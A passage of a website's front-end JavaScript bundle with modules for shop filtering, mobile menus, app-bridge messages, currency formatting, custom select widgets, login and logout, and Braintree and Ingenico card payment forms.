    var b_info = b.querySelector("[data-mkp-shop-info]")

    if(!a_info || !b_info) return 0

    if (a_info.hasAttribute(selectedFilterValue)) {
      a_value = a_info.getAttribute(selectedFilterValue)
    }
    if (b_info.hasAttribute(selectedFilterValue)) {
      b_value = b_info.getAttribute(selectedFilterValue)
    }

    if (!a_value || !b_value) {
      if (a.getAttribute("data-mkp-shop") > b.getAttribute("data-mkp-shop")) {
        return 1
      } else {
        return -1
      }
    }

    switch (selectedFilterType) {
      case 'number': 
      case 'exact_value':
        a_value = Number(a_value)
        b_value = Number(b_value)
        if (a_value > b_value) return 1
        else if (a_value < b_value) return -1
        else return 0 

      case ('boolean'):
        a_value = (a_value == 'true')
        b_value = (b_value == 'true')
        if (!a_value && b_value) return 1
        else if (a_value && !b_value) return -1
        else return 0
    }

  }

  // sets order for shops in a list
  var selectedShopsOrder = function () {
    for (let i=0; i < shopsArray.length; i++) {
      shopsArray[i].style.order = i
    }
  }

  // default order for shops list
  var defaultShopsOrder = function () {
    for (let i=0; i < shopsArray.length; i++) {
      shopsArray[i].style.order = ''
    }
  }

  // On order select change
  var sortShopsList = function (event) {
    var elem = event.target
    selectedFilterValue = elem.value

    // if default order
    if (selectedFilterValue == "no") {
      defaultShopsOrder()
      return
    }

    // if not default order
    var selected = elem.querySelector("option[value='" + selectedFilterValue + "']")
    selectedFilterType = selected.getAttribute("data-type")
    shopsArray = Array.from(shopsList)

    shopsArray.sort(compareShops)

    selectedShopsOrder()
  }
  

  /************************
    Initial setup
  ************************/

  // Setup events on categories & filters update
  
  var setEvents = function () {

    // set event on filters click
    var filtersList = document.querySelectorAll("[data-mkp-filters] [data-filter-name]")

    for (var i = 0; i < filtersList.length; i++) {
      filtersList[i].addEventListener("click", updateFilter, false)
    }

    // set events on category click
    var categoriesList = document.querySelectorAll("[data-category-shop]")

    for (var i = 0; i < categoriesList.length; i++) {
      categoriesList[i].addEventListener("click",updateCategories, false)
    }

    // shops order select in a list
    $j("[data-mkp-sort-select]").on("change", sortShopsList)

    // update shops display after filter or category change
    // document.dispatchEvent(updateDisplayEvent)
    updateDisplayEvent = new Event("updateDisplay")
    document.addEventListener("updateDisplay", displayShops)
  }

  var init = function () {
    shops = []
    filters = []

    // shops list
    shopsList = document.querySelectorAll("[data-mkp-shop]")
    noShopMessage = document.querySelector("[data-mkp-no-shop]")

    // set events
    setEvents()

    // create initial shops list
    var catsParent = document.querySelectorAll("[data-mkp-categories]")[0]
    updateShopsArray(catsParent)
  }

  return {
    init: init
  }

})()/*********************************************
 Menu: separated product pages layout
 Mobile Menu Scroll and left/right arrows
 Adds helper classes to mark scroll position
 *********************************************/

var MenuMobileScroll = (function () {
  var contentWidth,
    containerWidth,
    navigation,
    scroller,
    hiddenLeftClass = 'category-navigation_mobile-hidden-left',
    hiddenRightClass = 'category-navigation_mobile-hidden-right',
    LEFT_SCROLL_PADDING = 0.05 // default active item 5% left scroll padding

  function resized () {
    containerWidth = scroller.width()

    // Count full menu length (all items included)
    contentWidth = 0
    $j('[data-mobile-category-navigation] .category-navigation__item').each(function () { 
      contentWidth += $j(this).outerWidth(true) 
    })

    categoryChanged()
    toggleArrows()
  }

  function toggleArrows () {
    if (navigation.is(':hidden')) { return }
    var scrollLeft = scroller.scrollLeft()

    navigation.toggleClass(hiddenLeftClass, scrollLeft > 0)
    navigation.toggleClass(hiddenRightClass, (containerWidth + scrollLeft) < contentWidth)
  }

  function categoryChanged () {
    var current = $j('[data-mobile-category-navigation] .category-navigation__item_active')
    if(current.length == 0) { return }

    var current_pos = current.position()
    scroller.scrollLeft(current_pos.left - containerWidth * LEFT_SCROLL_PADDING)
  }

  // Setting left scroll padding: fraction of the full container width, e.g. .05 (==5%)
  function leftScrollPadding (leftPadding) { 
    if( (typeof leftPadding !== 'undefined') && (leftPadding >= 0) ) LEFT_SCROLL_PADDING = leftPadding
  }

  function init () {
    navigation = $j('[data-mobile-category-navigation]')

    scroller = $j('[data-mobile-category-navigation] .category-navigation__wrapper')
    scroller.on('scroll', toggleArrows)

    $j(window).on('load resize', resized)
    resized()
  }

  return {
    init: init,
    leftScrollPadding: leftScrollPadding
  }

}())
var setPushNotification = function (data_string) {
  var dataObj = JSON.parse(data_string)
  var method_type = ''
  var data = {}

  method_type = 'post'
  data = {
    'status': dataObj.body.status,
    'token': dataObj.body.token
  }

  $j.ajax({
    url: '/api/buyer_devices',
    type: method_type,
    data: data
  }).done(function (response_data) {
    var response = {
      'type': 'push',
      'status': response_data.success ? true : false,
    }

    if (dataObj.origin && dataObj.origin == 'website') {
      window.webkit.messageHandlers.cordova_iab.postMessage(JSON.stringify(response))
    }

    return response
  })
}

var sendSms = function (sms_message) {
  var messageObj = {
    'type': 'referral',
    'body': {
      'method': 'sms',
      'message': sms_message
    }
  }
  window.webkit.messageHandlers.cordova_iab.postMessage(JSON.stringify(messageObj))
}

var requestGeolocation = function () {
  var messageObj = {
    'type': 'geo',
    'body': {
      'method': 'get'
    }
  }
  window.webkit.messageHandlers.cordova_iab.postMessage(JSON.stringify(messageObj))
}

var setGeolocation = function (message_object) {
  // console.log("Geolocation")
  // console.log(message_object)
  return true
}

var triggerFacebookLogin = function (facebook_app_id) {
    var messageObj = {
        'type': 'facebook',
        'body': {
          'app_id': facebook_app_id,
        }
    }
    window.webkit.messageHandlers.cordova_iab.postMessage(JSON.stringify(messageObj))
}/***************************
 Money
 ***************************/

var Money = (function () {
  var UNKNOWN_CURRENCY = 'Unknown currency: '

  var toString = function (cents, currency, locale) {
    if (cents === null) return ''

    var sign = cents >= 0 ? '' : '-',
        decimal = Math.abs(cents) / 100,
        decimal_with_0 = '' + decimal.toFixed(0),
        decimal_with_2 = '' + decimal.toFixed(2)

    switch (currency) {
      case 'AED':
        return sign + decimal_with_2 + '&nbsp;AED'
      case 'AUD':
        return sign + '$' + decimal_with_2
      case 'BGN':
        return sign + decimal_with_2 + '&nbsp;лв'
      case 'BRL':
        return sign + 'R$' + '&nbsp;' + decimal_with_2
      case 'CAD':
        return sign + '$' + '&nbsp;' + decimal_with_2
      case 'CHF':
        return sign + 'CHF' + '&nbsp;' + decimal_with_2
      case 'CZK':
        return sign + 'Kč' + '&nbsp;' + decimal_with_2
      case 'EGP':
        return sign + decimal_with_2 + '&nbsp;L.E'
      case 'EUR':
        if (locale == 'nl-NL' || locale == 'en-IE')
          return sign + '€&nbsp;' + decimal_with_2
        else
          return sign + decimal_with_2 + '&nbsp;€'
      case 'GBP':
        return sign + '£' + '&nbsp;' + decimal_with_2
      case 'HKD':
        return sign + '$' + '&nbsp;' + decimal_with_2
      case 'ISK':
        return sign + 'kr' + '&nbsp;' + decimal_with_0
      case 'MAD':
        return sign + decimal_with_2 + '&nbsp;DH'
      case 'PHP':
        return sign + '₱' + '&nbsp;' + decimal_with_0
      case 'PKR':
        return sign + 'Rs.' + '&nbsp;' + decimal_with_2
      case 'RON':
        return sign + 'L' + '&nbsp;' + decimal_with_2
      case 'RUB':
        return sign + decimal_with_2 + '&nbsp;руб'
      case 'SGD':
        return 'SGD&nbsp;' + sign + decimal_with_2;
      case 'TND':
        return sign + decimal_with_2 + '&nbsp;DT'
      case 'UAH':
        return sign + decimal_with_2 + '&nbsp;грн'
      case 'USD':
        return sign + '$' + '&nbsp;' + decimal_with_2
      case 'XOF':
        return sign + 'F' + decimal_with_0
      case 'XPF':
        return sign + '₣' + decimal_with_0
      case 'ZAR':
        return sign + 'R' + decimal_with_0
      default:
        return console.warn(UNKNOWN_CURRENCY + currency)
    }
  }

  return {
    toString: toString
  }
})()
/*****************************
 NiceSelect
 Forked from https://github.com/hernansartorio/jquery-nice-select
 *****************************/

var NiceSelect = (function () {
  var convert = function (select) {
    // Hide native select
    select.hide()
    select.css('visibility', 'visible')

    // Create custom markup
    if (!select.next().hasClass('nice-select__container')) {

      select.after($j('<div></div>')
          .addClass('nice-select__container')
          .html($j('<div></div>')
              .addClass('nice-select')
              .addClass(select.attr('class') || '')
              .addClass(select.attr('disabled') ? 'disabled' : '')
              .attr('tabindex', select.attr('disabled') ? null : '0')
              .html('<span class="current"></span><ul class="list"></ul>')
          ))

      var nice_select = select.next()
      var options = select.find('option')
      var selected = select.find('option:selected')

      nice_select.find('.current').html(selected.data('display') || selected.text()).addClass('option_logo_' + selected.text().replace(/ +/g, ""))

      options.each(function (i) {
        var option = $j(this)
        if (option.attr('data-removed') != undefined) return true

        var display = option.data('display')
        nice_select.find('ul').append($j('<li></li>')
            .attr('data-value', option.val())
            .attr('data-display', (display || null))
            .addClass('option' +
                (option.is(':selected') ? ' selected' : '') +
                (option.is(':disabled') ? ' disabled' : ''))
            .addClass('option_logo_' + option.text().replace(/ +/g, ""))
            .html(option.text())
        )

      })
    }
  }

  var initListeners = function () {
    // Unbind existing events in case that the plugin has been initialized before
    $j(document).off('.nice_select')

    // Open/close
    $j(document).on('click.nice_select', '.nice-select', function (event) {
      var nice_select = $j(this)

      $j('.nice-select').not(nice_select).removeClass('open')
      nice_select.toggleClass('open')

      if (nice_select.hasClass('open')) {
        nice_select.find('.option')
        nice_select.find('.focus').removeClass('focus')
        nice_select.find('.selected').addClass('focus')
      } else {
        nice_select.focus()
      }
    })

    // Close when clicking outside
    $j(document).on('click.nice_select', function (event) {
      if ($j(event.target).closest('.nice-select').length === 0) {
        $j('.nice-select').removeClass('open').find('.option')
      }
    })

    // Option click
    $j(document).on('click.nice_select', '.nice-select .option:not(.disabled)', function (event) {
      var option = $j(this),
          nice_select = option.closest('.nice-select__container')

      nice_select.find('.selected').removeClass('selected')
      option.addClass('selected')

      var text = option.data('display') || option.text()
      nice_select.find('.current').text(text)
      nice_select.find('.current').text(text).attr('class','current').addClass('option_logo_' + text.replace(/ +/g, ""))
      nice_select.prev('select').val(option.data('value')).trigger('change')
    })

    // Keyboard events
    $j(document).on('keydown.nice_select', '.nice-select', function (event) {
      var nice_select = $j(this),
          focused_option = $j(nice_select.find('.focus') || nice_select.find('.list .option.selected'))

      if (event.keyCode == 32 || event.keyCode == 13) {
        // Space or Enter
        if (nice_select.hasClass('open')) {
          focused_option.trigger('click')
        } else {
          nice_select.trigger('click')
        }
        return false
      } else if (event.keyCode == 40) {
        // Down
        if (!nice_select.hasClass('open')) {
          nice_select.trigger('click')
        } else {
          var next_option = focused_option.nextAll('.option:not(.disabled)').first()
          if (next_option.length > 0) {
            nice_select.find('.focus').removeClass('focus')
            next_option.addClass('focus')
          }
        }
        return false
      } else if (event.keyCode == 38) {
        // Up
        if (!nice_select.hasClass('open')) {
          nice_select.trigger('click')
        } else {
          var prev_option = focused_option.prevAll('.option:not(.disabled)').first()
          if (prev_option.length > 0) {
            nice_select.find('.focus').removeClass('focus')
            prev_option.addClass('focus')
          }
        }
        return false
      } else if (event.keyCode == 27) {
        // Esc
        if (nice_select.hasClass('open')) {
          nice_select.trigger('click')
        }
      } else if (event.keyCode == 9) {
        // Tab
        if (nice_select.hasClass('open')) {
          return false
        }
      }
    })
  }

  var ie10Fix = function () {
    // Detect CSS pointer-events support, for IE <= 10. From Modernizr.
    var style = document.createElement('a').style
    style.cssText = 'pointer-events:auto'
    if (style.pointerEvents !== 'auto') {
      $j('html').addClass('no-csspointerevents')
    }
  }

  var init = function () {
    var nice_selects = $j('[data-nice-select]')
    if (nice_selects.length > 0) {
      initListeners()
      ie10Fix()
      nice_selects.each(function () {
        convert($j(this))
      })
    }
  }

  var updateFromSelect = function (_select) {
    var select = $j(_select),
        nice_select = select.next()

    if (!nice_select.hasClass('nice-select__container')) return

    nice_select.remove()
    convert(select)
  }

  return {
    init: init,
    updateFromSelect: updateFromSelect
  }
}())

/***********************************************
 Off canvas menus v.2 (bug fix & optimization)
 *********************************************/
var OffCanvas = (function () {
  var isMobile;

  var mobile = function () {
    return isMobile.is(":visible")
  }

  var throttle = function (method, context) {
    var delayTime = 250
    clearTimeout(method.tID)
    method.tID = setTimeout(function () {
      method.call(context)
    }, delayTime)
  }

  var closeFix = function () {
    var status = $j.sidr('status')
    if( (!mobile()) && status.opened ) {
      location.reload()
    }
  }

  var closeMenu = function () {
    var status = $j.sidr('status')
    if (status.opened) {
      $j.sidr('close', status.opened)
    }
  }

  var onResize = function () {
    throttle(function(){
      if(!mobile()) {
        closeMenu()
      }
    })
  }

  var menuOn = function () {
    $j('#page-overlay').show()
    $j('#page-overlay').on('click', closeMenu)
    $j(window).on('resize',onResize)
  }

  var menuOff = function () {
    $j('#page-overlay').hide()
    $j('#page-overlay').off('click')
    $j(window).off('resize',onResize)
  }

  var initSidr = function () {
    $j('#menu-off-canvas').sidr({
      name: 'main-menu-ofc',
      side: 'left',
      displace: false,
      onOpen: function () {
        $j('#main-menu-ofc').addClass('off-canvas_open')
        menuOn()
      },
      onClose: function () {
        menuOff()
      },
      onCloseEnd: function () {
        $j('#main-menu-ofc').removeClass('off-canvas_open')
      }
    })

    $j('#basket-off-canvas').sidr({
      name: 'sidebar-ofc',
      side: 'right',
      displace: false,
      onOpen: function () {
        console.log('open')
        $j('#sidebar-ofc').addClass('off-canvas_open')
        menuOn()
      },
      onClose: function () {
        menuOff()
        if(!mobile()) {
          setTimeout(closeFix,500) // check if off-canvas closed
        }
      },
      onCloseEnd: function () {
        $j('#sidebar-ofc').removeClass('off-canvas_open')
      }
    })
  }

  // fold/unfold submenu
  var onMenuSectionClick = function (e) {
    e.preventDefault()
    var parent = $j(this).closest('.mobile-menu__section_has-submenu')
    console.log(this)
    if (parent.hasClass('mobile-menu__section_unfolded')) {
      parent.removeClass('mobile-menu__section_unfolded')
    } else {
      $j('.mobile-menu__section_has-submenu.mobile-menu__section_unfolded').removeClass('mobile-menu__section_unfolded')
      parent.addClass('mobile-menu__section_unfolded')
    }
  }

  var openCurrentSection = function () {
    var active_element = $j('.off-canvas .mobile-menu__section_has-submenu:not(.mobile-menu__section_keep-close-on-load) .mobile-menu__item_active')[0]
    $j(active_element).closest('.mobile-menu__section_has-submenu').addClass('mobile-menu__section_unfolded')
  }

  var init = function () {
    $j(document).on('ready',function () {
      isMobile = $j('.header__burger-menu')
      initSidr()

      if (mobile() && window.location.toString().includes("#basket")) {
        $j("#basket-off-canvas")?.click()
        $j(".basket-menu__link")?.click()
        menuOn()
      }

      if (mobile() && window.location.toString().includes("#info")) {
        $j(".burger-menu__link").click()
        setTimeout(() => {
          $j(".mobile-menu__section-link")[0].click()
        }, 200)
        menuOn()
      }

      openCurrentSection()
      $j('.off-canvas .mobile-menu__section_has-submenu > .mobile-menu__section-link').on('click',onMenuSectionClick)
    })
  }

  return {
    init: init
  }

}())
/***************************************************************
 One Page menu
 **************************************************************/

var OnePageMenu = (function () {
  var categories,
      currentCategory,
      reactions

  var SCROLL_EXTRA_OFFSET = 5

  function resized () {
    categories = []
    currentCategory = null

    var previousBottom

    $j('.category__subcategory').each(function () {
      var top = $j(this).offset().top,
          bottom = top + $j(this).outerHeight()

      categories.push({
        id: $j(this).attr('id'),
        top: previousBottom || 0,
        bottom: bottom
      })

      previousBottom = bottom
    })

    scrolled()
  }

  function findCurrentCategory (scrollTop) {
    return categories.find(function (element) {
      return scrollTop >= element.top && scrollTop < element.bottom
    })
  }

  // Check/set/remove currently selected category
  function scrolled () {
    var scrollTop = $j(window).scrollTop() + visibleDisplayOffset()

    // Are we still in the same category?
    if (currentCategory && scrollTop >= currentCategory.top && scrollTop <= currentCategory.bottom) return

    // If not, find the current category and call the reactions
    currentCategory = findCurrentCategory(scrollTop)
    reactions.forEach(function (reaction) { reaction.categoryChanged(currentCategory) })
  }

  function visibleDisplayOffset () {
    return FixedTopbar.height() || 0
  }

  function scrollOffset () {
    return -visibleDisplayOffset() - SCROLL_EXTRA_OFFSET
  }

  function desktopMenuClick (e) {
    e.preventDefault()

    var element = $j(e.target).attr('href') || $j(e.target).parent().attr('href')
    var matches = element.match(/#(.*)/),
        id = matches && matches[1]

    if (id) {
      $j(window).scrollTo('#' + id, 250, {
        offset: scrollOffset(),

        // Need to recalculate the scroll offset at the end, as it can change when the scroll occurs (topbar gest fixed/unfixed)
        onAfter: function () {
          $j(window).scrollTo('#' + id, 0, { offset: scrollOffset() })
        }
      })
    }
  }

  function mobileMenuClick (e) {
    $j.sidr('close', 'main-menu-ofc')
    desktopMenuClick(e)
  }

  function init (_reactions) {
    reactions = _reactions
    reactions.forEach(function (reaction) { reaction.init() })

    $j('.category-navigation__list a[href^="/menu#"]').on('click', desktopMenuClick)
    $j('.mobile-menu__submenu a[href^="/menu#"]').on('click', mobileMenuClick)

    resized()
    $j(window).on('load resize', resized)
    $j(window).on('scroll', scrolled)
  }

  return {
    init: init
  }

}())
/*************************
 OnePageMenuMagellan
 *************************/

var OnePageMenuMagellan = (function () {
  function init () {}

  function categoryChanged (currentCategory) {
    $j('.category-navigation__item_active').removeClass('category-navigation__item_active')
    $j('.mobile-menu__item_active').removeClass('mobile-menu__item_active')

    if (currentCategory) {
      $j('.category-navigation__list [href=\'/menu#' + currentCategory.id + '\']').parent().addClass('category-navigation__item_active')
      $j('.mobile-menu__submenu [href=\'/menu#' + currentCategory.id + '\']').parent().addClass('mobile-menu__item_active')
    }
  }

  return {
    init: init,
    categoryChanged: categoryChanged
  }
}())
/*********************************************
 Menu: one page layout
 Mobile Menu Scroll and left/right arrows
 Adds helper classes to mark scroll position
 *********************************************/

var OnePageMenuMobileScroll = (function () {
  var contentWidth,
      containerWidth,
      navigation,
      scroller,
      hiddenLeftClass = 'category-navigation_mobile-hidden-left',
      hiddenRightClass = 'category-navigation_mobile-hidden-right',
      LEFT_SCROLL_PADDING = 0.05 // default left scroll padding = 5%

  function resized () {
    containerWidth = scroller.width()

    // Count full menu length (all items included)
    contentWidth = 0
    $j('[data-mobile-category-navigation] .category-navigation__item').each(function () { 
      contentWidth += $j(this).outerWidth(true) 
    })
  }

  function toggleArrows () {
    if (navigation.is(':hidden')) { return }
    var scrollLeft = scroller.scrollLeft()

    navigation.toggleClass(hiddenLeftClass, scrollLeft > 0)
    navigation.toggleClass(hiddenRightClass, (containerWidth + scrollLeft) < contentWidth)
  }

  // Parameter 'currentCategory' used for outside call compatibility
  function categoryChanged (currentCategory) {
    var current = $j('[data-mobile-category-navigation] .category-navigation__item_active')
    if(current.length == 0) { return }

    var current_pos = current.position()
    scroller.scrollLeft(current_pos.left - containerWidth * LEFT_SCROLL_PADDING)

    toggleArrows()
  }

  // Setting left scroll padding: fraction of the full container width, e.g. .05 (==5%)
  function leftScrollPadding (leftPadding) { 
    if( (typeof leftPadding !== 'undefined') && (leftPadding >= 0) ) LEFT_SCROLL_PADDING = leftPadding
  }

  function init () {
    navigation = $j('[data-mobile-category-navigation]')

    scroller = $j('[data-mobile-category-navigation] .category-navigation__wrapper')
    scroller.on('scroll', toggleArrows)

    $j(window).on('load resize', resized)
    resized()
  }

  return {
    init: init,
    leftScrollPadding: leftScrollPadding,
    categoryChanged: categoryChanged
  }
  
}())
/*****************************
 OrderPage
 *****************************/

var OrderPage = (function () {
  var initOldFolding = function () {
    $j('.order-page__list_old .order__header li[class!="order__header-print-link"]').click(function () {
      var clicked_header = $j(this).closest('.order__header'),
          is_active = clicked_header.hasClass('order__header_active')

      $j('.order__header').removeClass('order__header_active')
      clicked_header.toggleClass('order__header_active', !is_active)

      ft_fix.set_height()

      return false
    })
  }

  var initFolding = function () {
    $j('.order-row_order .order-row__header-item:not(.order-row__header-item_print)').click(function () {
      var clicked_header = $j(this).closest('.order-row__header'),
          is_active = clicked_header.hasClass('order-row__header_active')

      $j('.order-row__header').removeClass('order-row__header_active')
      clicked_header.toggleClass('order-row__header_active', !is_active)

      ft_fix.set_height()

      return false
    })
  }

  var init = function () {
    Util.showMore($j('.order-table__show-more'), $j('.order-row_order'), 5)
    initOldFolding() // For legacy touch themes using the old order page
    initFolding()
  }

  return {
    init: init
  }
}())
/*****************************
 Page
 *****************************/

var Page = (function () {
  var equalizeDivs = function (elements, nb_columns) {
    elements.height('')

    for (var i = 0; i < elements.length; i += nb_columns) {
      var row_elements = elements.slice(i, i + nb_columns),
          heights = row_elements.map(function (i, e) {
            return $j(e).height()
          }),
          max_height = Math.max.apply(Math, heights)
      row_elements.height(max_height)
    }
  }

  var equalizeProducts = function () {
    var category_products = $j('.category__products:visible')
    if (category_products.length == 0) return

    var first_product = $j('.product').first(),
        nb_columns = Math.floor(category_products.width() / first_product.width())
    if (nb_columns <= 1) {
      $j('.product__top,.product__bottom').height('')
      return
    }

    category_products.each(function () {
      equalizeDivs($j(this).find('.product__top'), nb_columns)
      equalizeDivs($j(this).find('.product__bottom'), nb_columns)
    })
  }

  var preventDuplicateFormSubmit = function (form) {
    var submitButton = $j(form).find(':submit')
    submitButton.attr('disabled', true)
    return false
  }

  return {
    // GDPR
    acceptGdpr: function () {
      $j.ajax({
        url: '/buyers/gdpr',
        type: 'post',
      }).done(function (data) {
        if (data.success) {
          $j(".gdpr-consent").hide()
        }
      })
    },

    // Date/time/method
    changeDeliveryMethodAndReloadPage: function (delivery_method) {
      Basket.showBusy()
      Util.redirect(Util.addKeyValueToURL(window.location.href, 'delivery_method', delivery_method))
    },

    changeTimeAndReloadPage: function (order_time) {
      Basket.showBusy()
      Util.redirect(Util.addKeyValueToURL(window.location.href, 'sc_order_time', order_time))
    },

    changeDateAndReloadPage: function (order_day) {
      Basket.showBusy()
      Util.redirect(Util.addKeyValueToURL(window.location.href, 'sc_order_day', order_day))
    },

    changeDateAndDeliveryMethodAndReloadPage: function (order_day, delivery_method) {
      Basket.showBusy()
      Util.redirect(Util.addParametersToURL(window.location.href, 'sc_order_day=' + order_day + '&delivery_method=' + delivery_method))
    },

    // Layout
    equalizeProducts: function () {
      equalizeProducts()
      $j(window).on('load resize', equalizeProducts)
    },

    // Login/logout
    goToLogin: function () {
      Util.redirect(Util.addKeyValueToURL('/login', 'redirect_to_page', Util.currentPage() || 'index'))
    },

    doLogin: function (form) {
      var redirect_url_param = Util.getParameterFromUrl(window.location.href, 'redirect_to_page')
      if (redirect_url_param) $j(form).find('input[name=redirect_to_page]').val(redirect_url_param)

      $j(form).submit()
    },

    doLogout: function () {
      var form = $j('<form></form>', { action: '/buyers/do_logout', method: 'post' })
      form.append('<input name="redirect_to_page" value="' + Util.currentPage() + '">')
      $j('body').append(form.hide())
      form.submit()
    },

    preventDuplicateFormSubmit: preventDuplicateFormSubmit
  }
}())
/*****************************
 Payment
 *****************************/
var Payment = (function () {
  var selectedMethodId = function () {
    return $j('input[name="payment_method_id"]:checked').val() || $j('input[name="payment_method_id"]').val()
  }

  var methodSelected = function (payment_method_id) {
    $j('[data-payment-method]').hide()
    $j('[data-payment-method=' + payment_method_id + ']').show()
  }

  return {
    selectedMethodId: selectedMethodId,
    methodSelected: methodSelected
  }
}())
 /*****************************
 Payment Braintree
 *****************************/

var PaymentBraintree = (function () {
  var braintree,
      authorization

  var initStep4 = function (_braintree, _authorization, styles, payment_method_id) {
    braintree = _braintree
    authorization = _authorization

    createBraintreeClient(function (clientInstance) {
      createHostedFields(clientInstance, styles, function (hostedFieldsInstance) {
        setupStep4Form(hostedFieldsInstance, payment_method_id)
      })
    })

    $j('input[name="saved_card_id"]').click(cardClicked)
    cardClicked()
  }

  var initStep5 = function (_braintree, _authorization, amount, nonce, useThreeDSecure) {
    braintree = _braintree
    authorization = _authorization

    createBraintreeClient(function (clientInstance) {
      setupStep5Form(clientInstance, amount, nonce, useThreeDSecure)
    })
  }

  var createBraintreeClient = function (onCreate) {
    var options = { authorization: authorization }

    var callback = function (clientErr, clientInstance) {
      if (clientErr) {
        console.error(clientErr.message)
      } else {
        onCreate(clientInstance)
      }
    }

    braintree.client.create(options, callback)
  }

  var createHostedFields = function (clientInstance, _styles, onCreate) {
    var options = {
      client: clientInstance,
      styles: _styles,
      fields: {
        number: {
          selector: '#braintree_card_number',
          placeholder: '4111 1111 1111 1111'
        },
        cvv: {
          selector: '#braintree_cv_code',
          placeholder: '123'
        },
        expirationDate: {
          selector: '#braintree_expiry',
          placeholder: 'MM/YYYY'
        }
      }
    }

    var callback = function (hostedFieldsErr, hostedFieldsInstance) {
      if (hostedFieldsErr) {
        console.error(hostedFieldsErr.message)
      } else {
        onCreate(hostedFieldsInstance)
      }
    }

    braintree.hostedFields.create(options, callback)
  }

  var setupStep4Form = function (hostedFieldsInstance, payment_method_id) {
    $j('#step4_submit').click(function (event) {
      if (payment_method_id == Payment.selectedMethodId()) {
        event.preventDefault()
        var saved_card_id = $j('input[name="saved_card_id"]:checked').val()
        if (saved_card_id) {
          payWithSavedCard(saved_card_id)
        } else {
          hostedFieldsInstance.tokenize(function (tokenizeErr, payload) {
            if (tokenizeErr) {
              console.error(tokenizeErr.message)
            } else {
              payWithNewCard(payload.nonce)
            }
          })
        }
      }
    })
  }

  var setupStep5Form = function (clientInstance, amount, nonce, useThreeDSecure) {
    $j('#braintree_submit_button').click(function () {

      if (useThreeDSecure) {
        verifyThreeDSecure(clientInstance, amount, nonce, function (verification) {
          submitBraintreeNonce(verification.nonce)
        })
      } else {
        submitBraintreeNonce(nonce)
      }
    })
  }

  var submitBraintreeNonce = function (nonce) {
    $j('#step5_form input[name=braintree_nonce]').val(nonce)
    $j('#step5_form').submit()
  }

  var verifyThreeDSecure = function (clientInstance, amount, nonce, onVerify) {
    braintree.threeDSecure.create({
      client: clientInstance
    }, function (threeDSecureErr, threeDSecureInstance) {
      if (threeDSecureErr) {
        console.error(threeDSecureErr.message)
      } else {
        threeDSecureInstance.verifyCard({
          amount: amount,
          nonce: nonce,
          addFrame: function (err, iframe) {
            $j('#threed_secure_container').html(iframe)
          },
          removeFrame: function () {
            $j('#threed_secure_container').html('OK')
          }
        }, function (err, verification) {
          if (err) {
            console.log('verification error:', err)
          } else {
            console.log('verification success:', verification)
            onVerify(verification)
          }
        })
      }
    })
  }

  var payWithSavedCard = function (saved_card_id) {
    var ghost_form = $j('<form action="/braintree_payments/use_saved_card" method="POST" id="braintree_ghost_form" style="display:none;"></form>')
    addPassthroughFields($j('#step4_form'), ghost_form)
    ghost_form.append('<input type="hidden" name="saved_card_id" value="' + saved_card_id + '" />')

    $j('body').append(ghost_form)
    $j('#braintree_ghost_form').submit()
  }

  var payWithNewCard = function (braintree_nonce) {
    var ghost_form = $j('<form action="/braintree_payments/use_new_card" method="POST" id="braintree_ghost_form" style="display:none;"></form>')
    addPassthroughFields($j('#step4_form'), ghost_form)

    var save_card = $j('input[name=braintree_save_card]').is(':checked'),
        cardholder_name = $j('input[name=braintree_holder_name]').val()

    if (cardholder_name.length > 0) {
      ghost_form.append('<input type="hidden" name="save_card" value="' + save_card + '" />')
      ghost_form.append('<input type="hidden" name="cardholder_name" value="' + cardholder_name + '" />')
      ghost_form.append('<input type="hidden" name="nonce" value="' + braintree_nonce + '" />')

      $j('body').append(ghost_form)
      $j('#braintree_ghost_form').submit()
    } else {
      alert('Cardholder name missing')
    }
  }

  var PASSHTHROUGH_FIELDS = ['payment_method_id', 'redirect_to_page', 'loyalty_points', 'cb_loyalty_points']

  var addPassthroughFields = function (source_form, dest_form) {
    $j.each(source_form.serializeArray(), function (i, field) {
      if (PASSHTHROUGH_FIELDS.indexOf(field.name) >= 0) {
        dest_form.append('<input type="hidden" name="passthrough_' + field.name + '" value="' + field.value + '" />')
      }
    })
  }

  var cardClicked = function () {
    // Hide warnings
    $j('.card-entry input').removeClass('card-entry__warning')

    // Toggle forms
    var saved_card_id = $j('input[name="saved_card_id"]:checked').val()
    $j('.card-entry__new-card').toggle(!saved_card_id)
  }

  return {
    initStep4: initStep4,
    initStep5: initStep5
  }
}())
/*****************************
 Payment Ingenico
 *****************************/

var PaymentIngenico = (function () {
  var with_card_number_config = {
    stored_card_inputs: {
      cv_code: 'card-entry__cvcode-input'
    },
    new_card_inputs: {
      CARDNO: 'ingenico_card_number',
      CN: 'ingenico_holder_name',
      ED: 'ingenico_expiry',
      CVC: 'ingenico_cv_code'
    }
  }

  var config = {
    brands: {
      'American Express': with_card_number_config,
      'Maestro': with_card_number_config,
      'MasterCard': with_card_number_config,
      'PostFinance Card': {
        new_card_inputs: {
          CN: 'ingenico_holder_name'
        },
        stored_card_inputs: {}
      },
      'VISA': with_card_number_config
    },
    passthrough_fields: ['payment_method_id', 'redirect_to_page', 'loyalty_points', 'cb_loyalty_points', 'credit_load_amount', 'transaction_type']
  }

  var checkFields = function (inputs) {
    inputs = $j(inputs)
    var r = true
    inputs.removeClass('card-entry__warning')
    inputs.each(function () {
      if ($j(this).val() == '') {
        $j(this).addClass('card-entry__warning')
        r = false
      }
    })
    return r
  }

  var cardClicked = function () {
    // Hide warnings
    $j('.card-entry input').removeClass('card-entry__warning')

    // Toggle forms
    $saved_card_input = $j('input[name="saved_card_id"]:checked')
    var saved_card_id = $saved_card_input.val()
    $j('.card-entry__new-card').toggle(!saved_card_id)

    // Show CV code only for the selected saved card
    $j('.card-entry__cvcode').hide()
    var brand_config = config.brands[$saved_card_input.data('brand')]
    if (saved_card_id && brand_config.stored_card_inputs.cv_code) {
      $j('[data-ingenico-saved-card=' + saved_card_id + '] .card-entry__cvcode').show()
    }
  }

  var addPassthroughFields = function (source_form, dest_form) {
    $j.each(source_form.serializeArray(), function (i, field) {
      if (config.passthrough_fields.indexOf(field.name) >= 0) {
        dest_form.append('<input type="hidden" name="passthrough_' + field.name + '" value="' + field.value + '" />')
      }
    })
  }

  var ingenico3Dparams = function (ghost_form) {
    ghost_form.append('<input type="hidden" name="browserColorDepth" value="' + screen.colorDepth + '"/>')
    ghost_form.append('<input type="hidden" name="browserJavaEnabled" value="' + navigator.javaEnabled() + '"/>')
    ghost_form.append('<input type="hidden" name="browserLanguage" value="' + navigator.language + '"/>')
    ghost_form.append('<input type="hidden" name="browserScreenHeight" value="' + screen.height + '"/>')
